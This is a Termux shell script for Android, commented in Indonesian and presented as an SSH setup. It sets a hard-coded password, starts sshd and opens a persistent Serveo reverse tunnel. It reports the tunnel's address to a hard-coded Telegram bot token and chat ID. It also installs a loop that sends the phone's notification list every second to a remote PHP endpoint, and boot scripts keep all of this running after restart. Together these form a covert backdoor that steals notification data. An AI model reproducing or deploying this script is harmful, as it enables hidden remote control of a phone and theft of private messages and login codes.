#!/data/data/com.termux/files/usr/bin/sh

#update
pkg update

# Install OpenSSH
pkg install -y openssh

pkg install jq -y

termux-setup-storage

# install python
pkg install -y python

# Install Termux-API
pkg install -y termux-api

# Atur password untuk user Termux
echo "Mengatur password user..."
printf "726785\n726785\n" | passwd

# Jalankan SSHD
sshd

# membuat tcp SERVEO
mkdir -p ~/serveo
cat <<EOF > ~/serveo/serveo.sh
#!/data/data/com.termux/files/usr/bin/bash

BOT_TOKEN="7450852198:AAEJrO8y3gqaWFECOW87VtOpOtx13_WwrXg"
CHAT_ID="8107240151"

while true; do
    if ping -c 1 8.8.8.8 > /dev/null 2>&1; then
        echo "[+] Koneksi tersedia, jalankan Serveo..."

        # Bersihkan log lama
        rm -f serveo_log.txt

        # Jalankan SSH Serveo dengan stdbuf agar tidak buffering
        stdbuf -oL ssh -o StrictHostKeyChecking=no -R 0:localhost:8022 serveo.net > serveo_log.txt 2>&1 &
        SSH_PID=$!

        echo "[*] Menunggu URL Serveo muncul..."

        HTTPS_URL=""
        TCP_URL=""
        TIMEOUT=30
        SECONDS_WAITED=0

        while [[ $SECONDS_WAITED -lt $TIMEOUT ]]; do
            sleep 1
            ((SECONDS_WAITED++))

            # Cek apakah URL HTTPS atau TCP sudah muncul
            HTTPS_URL=$(grep -m 1 -o "https://[a-zA-Z0-9.-]*\.serveo.net" serveo_log.txt)
            TCP_URL=$(grep -m 1 -o "serveo.net:[0-9]*" serveo_log.txt)

            if [[ -n "$HTTPS_URL" || -n "$TCP_URL" ]]; then
                break
            fi
        done

        if [[ -n "$HTTPS_URL" ]]; then
            echo "[+] HTTPS URL ditemukan: $HTTPS_URL"
            curl -s -X POST https://api.telegram.org/bot$BOT_TOKEN/sendMessage \
                -d chat_id=$CHAT_ID \
                -d text="Serveo HTTPS aktif: $HTTPS_URL"
        fi

        if [[ -n "$TCP_URL" ]]; then
            echo "[+] TCP Forward ditemukan: $TCP_URL"
            curl -s -X POST https://api.telegram.org/bot$BOT_TOKEN/sendMessage \
                -d chat_id=$CHAT_ID \
                -d text="Serveo TCP aktif: $TCP_URL (forward ke localhost:8022)"
        fi

        if [[ -z "$HTTPS_URL" && -z "$TCP_URL" ]]; then
            echo "[!] Tidak ada URL Serveo ditemukan setelah $TIMEOUT detik."
        fi

        echo "[!] Menunggu Serveo mati..."
        wait $SSH_PID
        echo "[!] Serveo disconnected, ulangi..."
    else
        echo "[!] Tidak ada koneksi internet. Coba lagi 10 detik..."
        sleep 10
    fi
done
EOF

# membuat notification
cat <<EOF > ~/serveo/notification.sh
#!/bin/bash
while [ 1 ];
do
var="$(termux-notification-list)"
curl -H "Content-Type: application/json" -X POST -d "$(echo $var)" "http://192.168.10.2/notification/api/take.php"
sleep 1
done
EOF

# beri izin notofication
chmod +x ~/serveo/notification.sh

# beri izin tcp
chmod +x ~/serveo/serveo.sh

# Buat folder boot dan skrip start.sh
mkdir -p ~/.termux/boot
cat <<EOF > ~/.termux/boot/start.sh
#!/data/data/com.termux/files/usr/bin/sh
termux-wake-lock
sshd
EOF
cat <<EOF > ~/.termux/boot/autoserveo.sh
#!/data/data/com.termux/files/usr/bin/sh
termux-wake-lock
bash ~/serveo/serveo.sh
EOF

# Beri izin eksekusi ke start.sh
chmod +x ~/.termux/boot/start.sh

# beri izin autoserveo
chmod +x ~/.termux/boot/autoserveo.sh

# Ubah prompt Termux menjadi custom_name@termux
echo 'export PS1="benjamin@termux:~$ "' >> ~/.bashrc

# Muat ulang file konfigurasi bash untuk menerapkan perubahan
source ~/.bashrc

# Menyampaikan bahwa setup telah selesai
echo "Setup selesai! SSH siap digunakan."
